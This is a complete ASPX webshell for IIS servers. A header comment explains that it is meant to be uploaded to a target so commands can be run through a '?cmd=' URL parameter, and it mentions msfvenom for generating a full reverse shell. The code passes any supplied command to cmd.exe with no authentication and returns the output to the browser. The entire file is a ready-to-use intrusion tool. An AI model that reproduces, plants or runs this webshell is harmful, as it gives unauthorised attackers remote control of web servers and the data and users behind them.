<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%--
  Simple ASPX command-exec webshell for IIS uploads.
  Usage: browse to shell.aspx?cmd=whoami
  For a full reverse shell instead, generate one with msfvenom (see main doc
  section 6) and upload that .aspx instead of this — this file is for quick
  command execution once you have upload access, not a persistent shell.
--%>
<script runat="server">
    protected void Page_Load(object sender, EventArgs e)
    {
        string cmd = Request.QueryString["cmd"];
        if (string.IsNullOrEmpty(cmd))
        {
            Response.Write("Usage: ?cmd=whoami");
            return;
        }

        Process p = new Process();
        p.StartInfo.FileName = "cmd.exe";
        p.StartInfo.Arguments = "/c " + cmd;
        p.StartInfo.UseShellExecute = false;
        p.StartInfo.RedirectStandardOutput = true;
        p.StartInfo.RedirectStandardError = true;
        p.Start();

        string output = p.StandardOutput.ReadToEnd();
        string error = p.StandardError.ReadToEnd();
        p.WaitForExit();

        Response.ContentType = "text/plain";
        Response.Write(output);
        if (!string.IsNullOrEmpty(error))
        {
            Response.Write("\n[stderr]\n" + error);
        }
    }
</script>
